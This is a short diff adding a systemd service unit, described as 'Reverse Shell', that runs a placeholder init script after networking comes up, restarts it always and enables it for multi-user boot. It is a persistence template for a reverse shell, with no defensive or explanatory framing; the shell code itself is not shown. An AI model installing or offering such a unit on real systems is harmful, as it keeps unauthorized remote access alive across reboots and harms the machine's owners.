@@ -1,0 +1,13 @@
+[Unit]
+Description=Reverse Shell
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/etc/init.d/"INIT FILE NAME"
+KillSignal=SIGTERM
+KillMode=process
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
